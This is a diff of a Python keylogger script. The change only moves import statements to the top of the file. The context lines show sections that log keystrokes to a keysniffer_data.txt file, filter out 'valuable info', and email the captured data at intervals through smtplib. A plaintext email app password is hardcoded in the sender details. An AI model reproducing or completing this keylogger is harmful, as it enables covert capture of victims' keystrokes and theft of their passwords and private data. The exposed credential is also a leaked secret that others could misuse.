@@ -1,7 +1,24 @@
-# ===================================================== File Existence Handling =====================================================
-
 import os
 import time
+
+import keyboard
+
+import re
+from collections import Counter
+
+import smtplib
+import time
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+import threading
+
+# ===================================================== File Existence Handling =====================================================
+
+# import os
+# import time
 
 
 def check_and_create_file(valuable_info, keysniffer_data, retries=3, delay=2):
@@ -37,7 +54,8 @@ def check_and_create_file(valuable_info, keysniffer_data, retries=3, delay=2):
 
 # ===================================================== Basic keylogger ================================================
 
-import keyboard
+# import keyboard
+
 
 path = os.path.abspath("keysniffer_data.txt")
 
@@ -82,8 +100,8 @@ def keylogger():
 
 # ===================================================== Filter and Extract Valuable Info ====================================
 
-import re
-from collections import Counter
+# import re
+# from collections import Counter
 
 
 def extract_valuable_info(keysniffer_data, filtered_data, interval=5):
@@ -130,12 +148,13 @@ def extract_valuable_info(keysniffer_data, filtered_data, interval=5):
 
 # ===================================================== Sending the Filtered Data via Email ====================================
 
-import smtplib
-import time
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
+# import smtplib
+# import time
+# from email.mime.multipart import MIMEMultipart
+# from email.mime.text import MIMEText
+# from email.mime.base import MIMEBase
+# from email import encoders
+
 
 # Email sender and receiver details
 password = "ixtzymqtphizlcet"
@@ -230,7 +249,8 @@ def reset_files_after_email(files):
 
 # ===================================================== Running the Program ======================================================
 
-import threading
+# import threading
+
 
 # Run keylogger and send_email_periodically simultaneously using threads
 if __name__ == "__main__":
